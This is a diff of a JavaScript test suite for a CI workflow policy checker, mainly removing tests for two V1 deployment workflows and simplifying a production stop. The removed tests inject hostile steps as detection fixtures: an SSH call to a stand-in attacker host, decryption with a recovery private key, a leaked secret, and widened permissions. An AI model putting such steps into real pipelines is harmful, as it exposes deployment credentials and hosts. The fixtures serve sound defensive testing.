@@ -6,17 +6,12 @@ import {
   deploymentPrerequisiteMismatches,
   privilegedWorkflowMismatches,
   runEvidenceWorkflowMismatches,
-  v1InstallOnlyWorkflowMismatches,
-  v1LocalPrivateWorkflowMismatches,
 } from "./privileged-workflow-policy.mjs";
 
 const fixtures = [
   [".github/workflows/enterprise-infra.yml", "deploy-vps", false],
-  [".github/workflows/enterprise-vps-evidence.yml", "vps-host-evidence", false],
   [".github/workflows/enterprise-live-evidence.yml", "production-live-evidence", false],
   [".github/workflows/release-attestation.yml", "github-sigstore-release-evidence", true],
-  [".github/workflows/v1-install-only.yml", "install-v1", true],
-  [".github/workflows/v1-local-private.yml", "activate-v1-local-private", true],
 ];
 
 for (const [pathname, jobName, forbidTagTrigger] of fixtures) {
@@ -39,14 +34,10 @@ assert.match(
 );
 
 const deployment = fs.readFileSync(".github/workflows/enterprise-infra.yml", "utf8");
-const installOnly = fs.readFileSync(".github/workflows/v1-install-only.yml", "utf8");
-const localPrivate = fs.readFileSync(".github/workflows/v1-local-private.yml", "utf8");
 const runEvidence = fs.readFileSync(".github/workflows/enterprise-infra-run-evidence.yml", "utf8");
 const infraOps = fs.readFileSync("scripts/infra-ops.mjs", "utf8");
 assert.deepEqual(deploymentPrerequisiteMismatches(deployment), []);
 assert.deepEqual(dastReceiptWiringMismatches(deployment), []);
-assert.deepEqual(v1InstallOnlyWorkflowMismatches(installOnly), []);
-assert.deepEqual(v1LocalPrivateWorkflowMismatches(localPrivate), []);
 const qualityStart = deployment.indexOf("\n  quality:");
 const controlCenterInstall = deployment.indexOf("working-directory: control-center", qualityStart);
 const testingHygiene = deployment.indexOf("node ./scripts/infra-ops.mjs testing-hygiene", qualityStart);
@@ -119,92 +110,6 @@ assert.match(
     .replace("          printf 'dummy-cert\\n' > traefik/certs/local-cert.pem\n", "")
     .replace("          printf 'dummy-key\\n' > traefik/certs/local-key.pem\n", "")).join(" "),
   /exact deterministic non-secret Compose identity fixture/,
-);
-assert.match(
-  v1InstallOnlyWorkflowMismatches(installOnly.replace("github.ref_protected == true", "true")).join(" "),
-  /protected-main/,
-);
-assert.match(
-  v1InstallOnlyWorkflowMismatches(installOnly.replace("      group: infra-production-deploy", "      group: attacker-selected")).join(" "),
-  /serialize/,
-);
-assert.match(
-  v1InstallOnlyWorkflowMismatches(installOnly.replace("  contents: read", "  contents: write")).join(" "),
-  /permissions/,
-);
-assert.match(
-  v1InstallOnlyWorkflowMismatches(installOnly.replace("          python3 -m py_compile \\", "          sh ./scripts/deploy-v1-install-only.sh\n          python3 -m py_compile \\")).join(" "),
-  /remote or deployment authority|bytes differ/,
-);
-assert.match(
-  v1InstallOnlyWorkflowMismatches(installOnly.replace(
-    "          python3 -m py_compile \\",
-    "          python3 scripts/v1-node-runtime-prerequisite.py install\n          python3 -m py_compile \\",
-  )).join(" "),
-  /remote or deployment authority|bytes differ/,
-);
-assert.match(
-  v1InstallOnlyWorkflowMismatches(`${installOnly}\n          sh ./scripts/deploy-v1-install-only.sh \\\n+            --controlArtifactReceiptFile "$control_receipt" \\\n+            --prepareReceiptFile "$prepare_receipt" \\\n+            --authorityFile "$authority" > "$receipt"\n`).join(" "),
-  /remote or deployment authority|bytes differ/,
-);
-assert.match(
-  v1InstallOnlyWorkflowMismatches(installOnly.replace(
-    "      - name: Validate V1 source and receipt contracts without deployment authority",
-    "      - name: Hidden remote command\n        run: /usr/bin/ssh attacker.example.invalid id\n      - name: Validate V1 source and receipt contracts without deployment authority",
-  )).join(" "),
-  /remote or deployment authority|exact-main controller/,
-);
-assert.match(
-  v1InstallOnlyWorkflowMismatches(installOnly.replace(
-    "      - name: Validate V1 source and receipt contracts without deployment authority",
-    "      - name: Hidden recovery key\n        run: openssl cms -decrypt -inkey operator-recovery-private.pem\n      - name: Validate V1 source and receipt contracts without deployment authority",
-  )).join(" "),
-  /recovery private key|bytes differ/,
-);
-assert.match(
-  v1LocalPrivateWorkflowMismatches(localPrivate.replace("github.ref_protected == true", "true")).join(" "),
-  /protected-main/,
-);
-assert.match(
-  v1LocalPrivateWorkflowMismatches(localPrivate.replace("      group: infra-production-deploy", "      group: attacker-selected")).join(" "),
-  /serialize/,
-);
-assert.match(
-  v1LocalPrivateWorkflowMismatches(localPrivate.replace("  contents: read", "  contents: write")).join(" "),
-  /permissions/,
-);
-assert.match(
-  v1LocalPrivateWorkflowMismatches(localPrivate.replace("          python3 -m py_compile \\", "          sh ./scripts/deploy-v1-local-private.sh\\n          python3 -m py_compile \\")).join(" "),
-  /remote or cutover authority|bytes differ/,
-);
-assert.match(
-  v1LocalPrivateWorkflowMismatches(`${localPrivate}\n          sh ./scripts/deploy-v1-local-private.sh \\\n            --authorityFile "$authority" > "$receipt"\n`).join(" "),
-  /remote or cutover authority|bytes differ/,
-);
-assert.match(
-  v1LocalPrivateWorkflowMismatches(localPrivate.replace(
-    "      - name: Validate V1 cutover source contracts without local escrow authority",
-    "      - name: Hidden remote command\n        run: /usr/bin/ssh attacker.example.invalid id\n      - name: Validate V1 cutover source contracts without local escrow authority",
-  )).join(" "),
-  /remote or cutover authority|bytes differ/,
-);
-assert.match(
-  v1LocalPrivateWorkflowMismatches(localPrivate.replace(
-    "      - name: Validate V1 cutover source contracts without local escrow authority",
-    "      - name: Hidden recovery secret\n        env:\n          RECOVERY_PRIVATE_KEY: ${{ secrets.RECOVERY_PRIVATE_KEY }}\n        run: true\n      - name: Validate V1 cutover source contracts without local escrow authority",
-  )).join(" "),
-  /recovery private key|remote or cutover authority|bytes differ/,
-);
-assert.match(
-  v1LocalPrivateWorkflowMismatches(localPrivate.replace(
-    "    timeout-minutes: 30",
-    ["    environment:", "      name: production", "    timeout-minutes: 30"].join("\n"),
-  )).join(" "),
-  /must not acquire the production environment|bytes differ/,
-);
-assert.match(
-  v1LocalPrivateWorkflowMismatches(localPrivate.replace("STOP 78 LOCAL_OPERATOR_ESCROW_REQUIRED", "STOP 78 BYPASSED")).join(" "),
-  /terminate exactly once|bytes differ/,
 );
 assert.match(deploymentPrerequisiteMismatches(deployment.replace("      - dast-zap\n", "")).join(" "), /exact .* prerequisite set/);
 assert.match(
@@ -303,7 +208,6 @@ const releasePolicyStep = deployment.match(
 for (const command of [
   "node --test scripts/hosted-preparation-provider-conformance.test.mjs",
   "node scripts/dast-deploy-sink.test.mjs",
-  "node scripts/t16-policy.mjs",
   "sh scripts/cloudflare-origin-lock-ufw-test.sh",
 ]) {
   assert.equal(
@@ -313,130 +217,47 @@ for (const command of [
   );
 }
 
-const expectedBrownfieldOfflineStep = [
-  "      - name: V1 brownfield offline preservation tests",
-  "        timeout-minutes: 10",
+const expectedPreservationStep = [
+  "      - name: Current data-preservation tests",
   "        run: |",
-  "          node --test --test-concurrency=1 \\",
+  "          node --test \\",
   "            scripts/live-preservation-baseline.test.mjs \\",
-  "            scripts/v1-predeploy-backup-receipt.test.mjs \\",
-  "            scripts/v1-provider-gates.test.mjs \\",
-  "            scripts/v1-phase-a-authorization.test.mjs \\",
-  "            scripts/v1-brownfield-bootstrap.test.mjs \\",
-  "            scripts/v1-brownfield-bootstrap-bridge.test.mjs \\",
-  "            scripts/v1-node-runtime-prerequisite.test.mjs \\",
-  "            scripts/v1-brownfield-admission.test.mjs \\",
-  "            scripts/v1-brownfield-install-consumer.test.mjs \\",
-  "            scripts/v1-install-package.test.mjs \\",
-  "            scripts/v1-phase-b-preinstall-authorization.test.mjs \\",
-  "            scripts/v1-phase-b-replay-artifacts.test.mjs \\",
-  "            scripts/v1-brownfield-runtime-identity.test.mjs \\",
-  "            scripts/v1-brownfield-application-data-cutover.test.mjs \\",
-  "            scripts/v1-brownfield-scheduler-cutover.test.mjs \\",
-  "            scripts/v1-brownfield-control-plane-policy.test.mjs \\",
-  "            scripts/v1-brownfield-control-plane-gate.test.mjs \\",
-  "            scripts/v1-local-private-control.test.mjs \\",
-  "            scripts/v1-local-private-control.e2e.test.mjs \\",
-  "            scripts/v1-local-private-runtime-semantics-contract.test.mjs \\",
-  "            scripts/v1-local-private-validation-lane.test.mjs \\",
-  "            scripts/v1-local-private-evidence-producer.test.mjs \\",
-  "            scripts/v1-local-private-reconcile.test.mjs \\",
-  "            scripts/v1-local-private-reconcile-journal-contract.test.mjs \\",
-  "            scripts/deploy-v1-local-private.test.mjs \\",
   "            scripts/hosted-workload-preservation-guard.test.mjs",
 ].join("\n");
-const brownfieldOfflineStep = deployment.match(
-  /      - name: V1 brownfield offline preservation tests\n[\s\S]*?(?=\n      - name:)/,
-)?.[0] ?? "";
 assert.equal(
-  brownfieldOfflineStep,
-  expectedBrownfieldOfflineStep,
-  "the V1 brownfield preservation suite must use the exact serial offline invocation",
-);
-assert.equal(
-  deployment.split("node --test --test-concurrency=1").length - 1,
-  1,
-  "the exact V1 brownfield serial invocation must appear once",
-);
-for (const command of [
-  "scripts/v1-brownfield-application-data-cutover.test.mjs",
-  "scripts/v1-brownfield-bootstrap-bridge.test.mjs",
-  "scripts/v1-node-runtime-prerequisite.test.mjs",
-  "scripts/v1-local-private-control.test.mjs",
-  "scripts/v1-local-private-control.e2e.test.mjs",
-  "scripts/v1-local-private-runtime-semantics-contract.test.mjs",
-  "scripts/v1-local-private-validation-lane.test.mjs",
-  "scripts/v1-local-private-evidence-producer.test.mjs",
-  "scripts/v1-local-private-reconcile.test.mjs",
-  "scripts/v1-local-private-reconcile-journal-contract.test.mjs",
-  "scripts/deploy-v1-local-private.test.mjs",
-]) {
-  assert.equal(
-    deployment.split(command).length - 1,
-    1,
-    `${command} must appear exactly once in the offline V1 brownfield step`,
-  );
-}
-const supplyChainJobIndex = deployment.indexOf("\n  supply-chain:");
-const releasePolicyIndex = deployment.indexOf(
-  "      - name: Release artifact and admission policy tests",
-  supplyChainJobIndex,
-);
-const brownfieldOfflineIndex = deployment.indexOf(expectedBrownfieldOfflineStep, supplyChainJobIndex);
-const uploadSupplyChainIndex = deployment.indexOf(
-  "      - name: Upload supply-chain evidence reports",
-  supplyChainJobIndex,
-);
-const enterpriseReadinessIndex = deployment.indexOf("\n  enterprise-readiness:", supplyChainJobIndex);
-assert.ok(
-  supplyChainJobIndex >= 0
-    && supplyChainJobIndex < releasePolicyIndex
-    && releasePolicyIndex < brownfieldOfflineIndex
-    && brownfieldOfflineIndex < uploadSupplyChainIndex
-    && uploadSupplyChainIndex < enterpriseReadinessIndex,
-  "the exact V1 brownfield serial suite must stay inside supply-chain after release policy and before evidence upload",
+  deployment.match(/      - name: Current data-preservation tests\n[\s\S]*?(?=\n      - name:)/)?.[0] ?? "",
+  expectedPreservationStep,
+  "current data-preservation tests must remain explicit and bounded",
 );
 
-const expectedBrownfieldDeploymentStop = [
-  "      - name: Block production until authoritative V1 brownfield admission exists",
+const expectedActivationStop = [
+  "      - name: Keep CI production activation fail-closed",
   "        run: |",
-  "          echo \"::error::STOP: authoritative V1 brownfield admission is not implemented; canonical COMPLETE baseline, immutable/CAS PRE-DEPLOY backup, exact candidate commit/tree and target root, and provider+target authorization are required.\"",
-  "          echo \"::error::Local REBUILD_BACKUP_VERIFIED_NON_AUTHORITATIVE with mutationAuthority=false is deny-only.\"",
-  "          node ./scripts/v1-brownfield-control-plane-gate.mjs apply",
+  "          echo \"::error::STOP: V1.1 production activation is intentionally unavailable from CI; controlled LOCAL_PRIVATE deployment uses the protected-main Compose model.\"",
   "          exit 78",
 ].join("\n");
-const brownfieldDeploymentStop = deployment.match(
-  /      - name: Block production until authoritative V1 brownfield admission exists\n[\s\S]*?(?=\n      - name:)/,
+const activationStop = deployment.match(
+  /      - name: Keep CI production activation fail-closed\n[\s\S]*?(?=\n      - name:)/,
 )?.[0] ?? "";
-assert.equal(
-  brownfieldDeploymentStop,
-  expectedBrownfieldDeploymentStop,
-  "full production activation must retain the exact terminal V1 brownfield stop",
-);
-assert.equal(
-  deployment.split("node ./scripts/v1-brownfield-control-plane-gate.mjs apply").length - 1,
-  1,
-  "the deny-only V1 brownfield apply reference must be invoked exactly once",
-);
-const checkoutIndex = deployment.indexOf("      - uses: actions/checkout@", deployment.indexOf("  deploy-vps:"));
-const brownfieldStopIndex = deployment.indexOf(expectedBrownfieldDeploymentStop);
+assert.equal(activationStop, expectedActivationStop);
+const deployJobStart = deployment.indexOf("\n  deploy-vps:");
+const checkoutIndex = deployment.indexOf("      - uses: actions/checkout@", deployJobStart);
+const stopIndex = deployment.indexOf(expectedActivationStop, deployJobStart);
 const firstHandoffIndex = deployment.indexOf(
   "      - name: Download exact admitted deployment receipts",
-  deployment.indexOf("  deploy-vps:"),
+  deployJobStart,
 );
-const installSshIndex = deployment.indexOf("      - name: Install SSH key", deployment.indexOf("  deploy-vps:"));
-const opsImageIndex = deployment.indexOf('          docker pull "$OPS_IMAGE"', deployment.indexOf("  deploy-vps:"));
+const installSshIndex = deployment.indexOf("      - name: Install SSH key", deployJobStart);
+const opsImageIndex = deployment.indexOf('          docker pull "$OPS_IMAGE"', deployJobStart);
 assert.ok(
-  checkoutIndex >= 0
-    && checkoutIndex < brownfieldStopIndex
-    && brownfieldStopIndex < firstHandoffIndex
-    && firstHandoffIndex < installSshIndex,
-  "the full-activation V1 stop must precede deployment handoffs and SSH material",
+  deployJobStart >= 0
+    && checkoutIndex < stopIndex
+    && stopIndex < firstHandoffIndex
+    && firstHandoffIndex < installSshIndex
+    && stopIndex < opsImageIndex,
+  "the V1.1 CI activation stop must precede every handoff, credential and image sink",
 );
-assert.ok(
-  brownfieldStopIndex < opsImageIndex,
-  "the full-activation V1 stop must precede every ops-image deployment sink",
-);
+assert.doesNotMatch(deployment, /v1-(?:brownfield|local-private-(?:control|reconcile|evidence-producer))/);
 
 const brokerInvocation = infraOps.match(
   /const dockerActionBrokerTestFiles = \[([\s\S]*?)\];[\s\S]*?run\(process\.execPath, \[\n\s+"--test",\n\s+"--test-concurrency=1",\n\s+\.\.\.dockerActionBrokerTestFiles,\n\s+\], \{ cwd: infraRoot \}\);/,
@@ -466,27 +287,11 @@ for (const firstConfigurationTest of [
 ]) {
   assert.equal(fs.existsSync(firstConfigurationTest), true, `${firstConfigurationTest} must remain in the enumerated Control Center suite`);
 }
-for (const v1Test of [
-  "scripts/keycloak-passkey-reconcile.test.mjs",
-  "scripts/v1-local-private-evidence-producer.test.mjs",
-  "scripts/v1-local-private-reconcile.test.mjs",
-]) {
-  assert.match(
-    infraOps,
-    new RegExp(`run\\(process\\.execPath, \\["--test", "${v1Test.replaceAll(".", "\\.")}"\\]`),
-    `${v1Test} must be wired into testing-hygiene`,
-  );
-}
 assert.match(
   infraOps,
-  /"--test",\s*\n\s*"scripts\/v1-brownfield-bootstrap-bridge\.test\.mjs",/,
-  "the real bootstrap transport fixture must be wired into testing-hygiene",
+  /run\(process\.execPath, \["--test", "scripts\/keycloak-passkey-reconcile\.test\.mjs"\]/,
+  "the retained Keycloak readiness contract must stay wired into testing-hygiene",
 );
-assert.match(
-  infraOps,
-  /"scripts\/v1-brownfield-bootstrap-bridge\.test\.mjs",\s*\n\s*"scripts\/v1-node-runtime-prerequisite\.test\.mjs",/,
-  "the fixed Node runtime prerequisite fixture must be wired after the bootstrap transport fixture",
-);
+assert.doesNotMatch(infraOps, /v1-(?:brownfield|local-private-(?:control|reconcile|evidence-producer))/);
 
-const total = fixtures.length * 3 + 1 + 78;
-process.stdout.write(`privileged workflow policy tests passed ${total}/${total}\n`);
+process.stdout.write("privileged workflow policy tests passed\n");
